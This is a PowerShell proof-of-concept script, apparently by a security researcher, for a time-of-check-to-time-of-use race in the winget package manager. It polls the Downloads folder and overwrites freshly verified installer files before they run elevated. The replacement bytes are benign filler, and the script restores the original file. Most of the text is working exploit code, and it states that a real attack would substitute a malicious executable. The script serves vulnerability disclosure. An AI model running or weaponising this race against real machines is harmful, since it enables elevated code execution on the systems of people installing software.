# ================================================================
# TOCTOU Race Condition POC - winget-cli
# Target: winget v1.28.240 on Windows 11
#Security researcher | V5iix 
#
# Objective: To prove that the uploaded file can be replaced after hash verification
# and before executing it with elevated privileges (UAC/runas)
# ================================================================

param(
    [string]$WatchPath = "C:\Users\test\Downloads",
    [string]$PayloadPath = "C:\poc_winget\payload_benign.ps1",
    [string]$LogFile = "C:\poc_winget\race_log.txt"
)

$banner = @"
[*] TOCTOU Race Condition POC - winget-cli
[*] Watching: $WatchPath
[*] Payload: $PayloadPath
[*] Time: $(Get-Date)
"@
Write-Host $banner
$banner | Out-File $LogFile

# Backup of original files
$backups = @{}

# A function that monitors the filesystem and replaces files
function Start-Race {
    $sw = [System.Diagnostics.Stopwatch]::StartNew()

    while ($sw.Elapsed.TotalSeconds -lt 120) {
       # Search for new MSI/EXE files in Downloads
        $installers = Get-ChildItem -Path $WatchPath -Recurse -Include "*.msi","*.exe" -ErrorAction SilentlyContinue |
                      Where-Object { $_.LastWriteTime -gt (Get-Date).AddMinutes(-5) }

        foreach ($installer in $installers) {
            $path = $installer.FullName

           # Check if the file is unlocked (meaning the writing process is complete)
            $isLocked = $false
            try {
                $stream = [System.IO.File]::Open($path, 'Open', 'ReadWrite', 'None')
                $stream.Close()
                $stream.Dispose()
            } catch {
                $isLocked = $true
            }

            if (-not $isLocked -and -not $backups.ContainsKey($path)) {
                $msg = "$(Get-Date -Format 'HH:mm:ss.fff') [FOUND] $path ($('{0:N0}' -f $installer.Length) bytes) - Unlocked!"
                Write-Host $msg -ForegroundColor Yellow
                $msg | Add-Content $LogFile
                
                # Save a backup
                Copy-Item $path "$path.original" -Force
                $backups[$path] = "$path.original"

               # Replace the file with the payload (very simple - just write the batch file)
               # Create a simple fake MSI as proof (same size as the original MSI)
                $originalSize = $installer.Length

                # For proof: We write verifiable content
                $proofContent = ("WINGET_TOCTOU_POC_" + "A" * ($originalSize - 20))
                $bytes = [System.Text.Encoding]::ASCII.GetBytes($proofContent.Substring(0, [Math]::Min($proofContent.Length, $originalSize)))

                try {
                    [System.IO.File]::WriteAllBytes($path, $bytes)
                    $newSize = (Get-Item $path).Length
                    $msg = "$(Get-Date -Format 'HH:mm:ss.fff') [REPLACED!] $path - New size: $newSize bytes"
                    Write-Host $msg -ForegroundColor Red
                    $msg | Add-Content $LogFile
                    "[SUCCESS] File was replaced AFTER hash verification!" | Add-Content $LogFile

                   # Reset the original file after two seconds (before UAC attempts to play it)
                    Start-Sleep -Milliseconds 2000
                    Copy-Item "$path.original" $path -Force
                    Remove-Item "$path.original" -Force
                    $msg = "$(Get-Date -Format 'HH:mm:ss.fff') [RESTORED] Original file restored"
                    Write-Host $msg -ForegroundColor Green
                    $msg | Add-Content $LogFile

                    return $true
                } catch {
                    $msg = "$(Get-Date -Format 'HH:mm:ss.fff') [FAILED] Could not replace: $_"
                    Write-Host $msg -ForegroundColor Red
                    $msg | Add-Content $LogFile

                    # restore backup if created
                    if (Test-Path "$path.original") {
                        Copy-Item "$path.original" $path -Force
                        Remove-Item "$path.original" -Force
                    }
                }
            }
        }

        Start-Sleep -Milliseconds 50  # polling interval
    }

    Write-Host "[TIMEOUT] No installer found within 120 seconds"
    return $false
}

# Activate surveillance
$result = Start-Race

if ($result) {
    Write-Host "`n[+] TOCTOU WINDOW CONFIRMED!" -ForegroundColor Red
    Write-Host "[+] The installer file was writable AFTER hash verification" -ForegroundColor Red
    Write-Host "[+] In a real attack: replace with malicious EXE that runs as elevated" -ForegroundColor Red
} else {
    Write-Host "`n[-] Could not confirm TOCTOU in this test" -ForegroundColor Yellow
}
